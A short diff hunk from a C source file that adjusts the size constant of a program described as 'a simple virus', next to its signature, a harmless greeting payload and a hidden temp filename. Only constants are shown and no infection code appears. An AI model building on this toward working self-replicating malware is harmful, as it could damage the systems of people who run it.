@@ -8,7 +8,7 @@
 #include <unistd.h>		// for close()
 
 #define SIGNATURE 4033
-#define SIZE 14064
+#define SIZE 14056
 #define PAYLOAD_MESSAGE "Hello! This is a simple virus!"
 #define TEMP_FILENAME ".tempFile"
 
